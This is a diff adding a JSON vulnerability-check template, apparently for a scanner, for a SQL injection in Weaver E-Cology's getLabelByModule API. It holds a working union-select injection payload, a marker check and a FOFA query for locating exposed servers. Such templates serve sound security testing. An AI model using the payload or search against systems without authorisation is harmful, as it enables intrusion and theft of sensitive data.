@@ -1,0 +1,37 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology getLabelByModule SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限等。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-E-Weaver\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_43567873/article/details/137908375",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1433223001'+--"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "1433223001"
+        }
+      ]
+    }
+  }
+}
